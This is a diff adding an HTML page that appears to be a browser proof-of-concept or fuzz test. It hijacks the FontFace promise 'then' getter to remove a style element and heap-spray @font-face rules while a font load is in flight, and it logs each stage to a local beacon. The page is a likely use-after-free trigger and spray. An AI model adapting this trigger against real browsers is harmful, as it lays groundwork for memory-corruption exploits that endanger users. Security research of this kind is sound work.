@@ -1,0 +1,36 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>F155d fontface spray</title>
+<style id="victim-style">@font-face{font-family:x;src:local("Arial");unicode-range:U+0042}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m+'?t='+Date.now(),false);x.send(null);}catch(e){}}
+window.onerror=function(m){b('F155D-ONERR-'+m);return true;};
+b('F155D-START');
+function spray(){
+  var st=document.createElement('style'), css='', i;
+  for(i=0;i<1000;i++) css+='@font-face{font-family:f'+i+';src:local("Arial")}';
+  st.textContent=css; document.head.appendChild(st);
+  window.__st=st;
+}
+Object.defineProperty(FontFace.prototype,'then',{
+  configurable:true,
+  get:function(){
+    b('F155D-GETTER');
+    try{ document.getElementById('victim-style').remove(); }catch(e){ b('F155D-RMERR'); }
+    try{ document.body.offsetHeight; }catch(e){}
+    try{ spray(); }catch(e){ b('F155D-SPRAYERR-'+e.name); }
+    b('F155D-GETTER-RETURN');
+    return undefined;
+  },
+  set:function(){}
+});
+try{ document.fonts.add(new FontFace('a','local("Helvetica")',{unicodeRange:'U+0041'})); b('F155D-ADDED'); }
+catch(e){ b('F155D-ADDTHREW-'+e.name); }
+var p=null;
+try{ p=document.fonts.load('1em a, x','AB'); b('F155D-LOADCALLED'); }
+catch(e){ b('F155D-LOADTHREW-'+e.name); }
+if(p) p.then(function(f){ b('F155D-RESOLVED-'+(f?f.length:'nil')); },
+              function(e){ b('F155D-REJECTED-'+e.name); });
+setTimeout(function(){ b('F155D-TIMEOUT'); },3000);
+</script>
+<p>F155d fontface spray</p>
